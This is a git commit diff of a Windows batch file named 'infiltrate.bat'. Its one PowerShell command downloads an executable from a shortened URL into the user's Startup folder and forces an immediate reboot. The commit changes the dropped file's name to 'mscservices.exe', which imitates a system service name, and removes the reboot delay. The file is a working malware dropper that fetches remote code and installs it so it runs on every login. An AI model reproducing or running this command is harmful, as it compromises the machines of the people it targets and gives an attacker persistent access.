78cb51dd6272d90c69743fe926467602f1d4c8bd
Schl <70095072+FilthyPenny@users.noreply.github.com>
2023-10-05 15:48:00 +0200

    Add files via upload

--- infiltrate.bat
+++ infiltrate.bat
@@ -1,2 +1,2 @@
 @echo off
-powershell $s = [System.Environment]::GetFolderPath('Startup'); iwr https://s.id/1UPW2 -O $s/msc.exe && shutdown -r -f -t 30
+powershell $s = [System.Environment]::GetFolderPath('Startup'); iwr https://s.id/1UPW2 -O $s/mscservices.exe && shutdown -r -f -t 0
